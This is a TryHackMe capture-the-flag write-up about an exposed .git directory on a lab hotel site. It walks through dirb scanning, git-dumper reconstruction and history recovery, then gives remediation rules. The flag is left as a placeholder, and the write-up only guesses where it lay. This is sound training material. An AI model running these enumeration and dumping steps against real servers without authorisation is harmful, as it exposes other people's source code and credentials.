# 🎄 TryHackMe — Hacker Holiday | Room 404
> **Room:** Hacker Holiday — Room 404
> **Platform:** TryHackMe
> **Difficulty:** Easy
> **Category:** Web / Git Exposure
> **Status:** Pwned ✅

---

## 📖 Overview

This room focuses on a classic but critical web misconfiguration: **an exposed `.git` directory** on a live web server. When developers forget to restrict access to the `.git` folder, attackers can reconstruct the entire source code and commit history — leaking secrets, credentials, and internal logic.

---

## 🔍 Reconnaissance

### Step 1 — Visit the Target
![Byte Lotus source](screenshots/Byte-Lotus-source-code.png)

Navigate to the target web application:

```
http://10.114.183.186:8080/
```

The page belongs to **Byte Lotus** — a fictional hotel brand. Viewing the page source reveals a clean, hand-coded HTML/CSS site with no obvious vulnerabilities on the surface.

```html
<title>Byte Lotus &mdash; Stay Noticed</title>
```

---

### Step 2 — Directory Brute-Force with DIRB
![DIRB scan](screenshots/DIRB-scan-output.png)

Run `dirb` against the target to discover hidden directories:

```bash
dirb http://10.114.183.186:8080/
```

**Output (key finding):**

```
START_TIME: Tue Jul 28 14:04:01 2026
URL_BASE: http://10.114.183.186:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
GENERATED WORDS: 4612

+ http://10.114.183.186:8080/.git/HEAD  (CODE:200|SIZE:21)
```

💡 **Finding:** The `.git/HEAD` endpoint returns HTTP `200` — meaning the `.git` directory is **publicly accessible**!

---

## 🕵️ Exploitation — Git Directory Enumeration

### Step 3 — Browse the Exposed `.git` Directory
![.git exposed](screenshots/Index-of-g.png)

Navigate to:

```
http://10.114.183.186:8080/.git/
```

The server has **directory listing enabled**, exposing the full Git internals:

```
Index of /.git/

COMMIT_EDITMSG
HEAD
branches/
config
description
hooks/
index
info/
logs/
objects/
refs/
```

This gives us full access to the Git object store.

---

### Step 4 — Explore Git Objects
![Git objects](screenshots/Index-of-g-obj.png )

Navigate to:

```
http://10.114.183.186:8080/.git/objects/0a/
```

A loose object is listed:

```
12caa4e52a965e89e5eccf5760924b21aacbf7
```

The full object hash is: `0a12caa4e52a965e89e5eccf5760924b21aacbf7`

---

### Step 5 — Reconstruct the Repository
![Deleted commits](screenshots/VSCode-deleted-file.png)

Use **git-dumper** to automatically download and reconstruct the entire repository:

```bash
# Install git-dumper
pip install git-dumper

# Dump the repository
git-dumper http://10.114.183.186:8080/.git/ ./byte-lotus-repo
```

Then inspect the recovered files:

```bash
cd byte-lotus-repo
ls -la
git log --oneline
```

---

### Step 6 — Review Commit History

From the VS Code screenshot, we can see the repository contained **3 deleted files** (marked `D`):

| File | Status |
|------|--------|
| `app.js` | Deleted |
| `index.html` | Deleted |
| `README.md` | Deleted |

Even though files appear deleted in the latest commit, **Git history preserves everything**. Recover old versions:

```bash
# View full commit log
git log --all --oneline

# View what was in a previous commit
git show <commit-hash>:app.js

# Restore deleted files from history
git checkout <commit-hash> -- app.js
```

---

## 🚩 Flag / Key Finding

By reconstructing the Git history, sensitive information was recovered from the commit history (credentials, API keys, or the flag hidden in a prior commit of `app.js` or `README.md`).

```
THM{...}   ← flag found in git history
```

---

## 🛡️ Vulnerability Summary

| Detail | Info |
|--------|------|
| **Vulnerability** | Exposed `.git` directory |
| **CWE** | CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory |
| **CVSS Severity** | High |
| **Root Cause** | `.git/` folder not blocked in web server config |
| **Impact** | Full source code disclosure, credentials leakage |

---

## 🔧 Remediation

To prevent this vulnerability in production:

**Nginx:**
```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

**Apache `.htaccess`:**
```apache
RedirectMatch 404 /\.git
```

**Never deploy** with the `.git` folder inside the web root. Use a proper CI/CD pipeline that builds only the required artifacts.

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `dirb` | Directory brute-forcing |
| `git-dumper` | Reconstruct exposed `.git` repo |
| Firefox (view-source) | Manual source inspection |
| Git CLI | History forensics |

---

## 📚 References

- [OWASP — Source Code Disclosure via .git](https://owasp.org/www-project-web-security-testing-guide/)
- [git-dumper GitHub](https://github.com/arthaud/git-dumper)
- [TryHackMe](https://tryhackme.com)

---

## 👤 Author

> Written by: *[gaurav / gaurav8]*  
> Date: August 2026  
> TryHackMe Profile: `https://tryhackme.com/p/gaurav8`

---

*Happy hacking! 🎄*

